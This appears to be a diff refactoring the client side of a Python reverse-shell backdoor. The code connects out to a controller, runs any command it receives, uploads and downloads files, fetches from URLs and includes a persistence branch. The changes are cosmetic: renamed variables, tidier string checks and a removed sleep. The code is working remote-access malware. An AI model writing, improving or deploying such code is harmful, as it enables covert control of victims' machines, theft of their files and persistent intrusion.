@@ -4,7 +4,7 @@ import os
 import sys
 import time
 import socket
-import subprocess
+import subprocess as sp
 from socket import AF_INET, SOCK_STREAM
 from urllib.request import urlopen
 from common import pr, clear, get_cipher
@@ -90,8 +90,8 @@ def Exec(cmde):
 
 while True:
   try:
-    s = socket.socket(AF_INET, SOCK_STREAM)
-    s.connect((HOST, PORT))
+    sock = socket.socket(AF_INET, SOCK_STREAM)
+    sock.connect((HOST, PORT))
 
     cipher = get_cipher()
 
@@ -100,32 +100,31 @@ while True:
 
     if data == 'activate':
       active = True
-      Send(s, "\n"+os.getcwd()+">")
+      Send(sock, os.getcwd() + '>')
 
     while active:
-      data = Receive(s)
+      data = Receive(sock)
 
       if data == 'exit':
-        Send(s, 'exit ok')
+        Send(sock, 'exit ok')
         break
+        # TODO
 
-      elif data.startswith("cd ") == True:
+      elif data.startswith('cd '):
         try:
           os.chdir(data[3:])
           stdoutput = ""
         except:
-          stdoutput = "Error opening directory.\n"
+          stdoutput = "Error changing directory.\n"
 
-      elif data.startswith("download"):
-        # Upload the file
-        stdoutput = Upload(s, data[9:])
+      elif data.startswith('download '):
+        stdoutput = Upload(sock, data[9:])
 
-      elif data.startswith("downhttp"):
-        # Download from url
-        stdoutput = Downhttp(s, data[9:])
+      elif data.startswith('downhttp '):
+        stdoutput = Downhttp(sock, data[9:])
 
-      elif data.startswith("upload"):
-        stdoutput = Download(s, data[7:])
+      elif data.startswith('upload '):
+        stdoutput = Download(sock, data[7:])
 
       elif data.startswith("persist"):
         # Attempt persistence
@@ -136,11 +135,9 @@ while True:
       else:
         stdoutput = Exec(data)
 
-      stdoutput = stdoutput+"\n"+os.getcwd()+">"
-      Send(s, stdoutput)
-
-    time.sleep(3)
+      stdoutput = stdoutput + '\n' + os.getcwd() + '>'
+      Send(sock, stdoutput)
   except socket.error:
-    s.close()
+    sock.close()
     time.sleep(10)
     continue
